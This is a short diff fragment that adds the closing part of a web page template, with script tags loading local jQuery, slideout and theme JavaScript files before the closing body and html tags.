+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
